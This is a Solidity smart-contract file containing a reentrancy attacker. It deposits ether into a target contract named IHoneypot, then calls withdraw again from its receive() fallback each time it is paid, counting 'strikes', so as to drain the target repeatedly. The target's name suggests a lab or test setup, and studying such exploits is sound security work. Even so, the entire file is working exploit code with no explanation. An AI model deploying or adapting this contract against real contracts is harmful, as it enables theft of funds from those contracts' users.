// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IHoneypot {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IHoneypot public immutable target;
    uint256 public strikes;

    constructor(address payable honeypot) {
        target = IHoneypot(honeypot);
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        strikes += 1;
        target.withdraw(msg.value);
    }
}
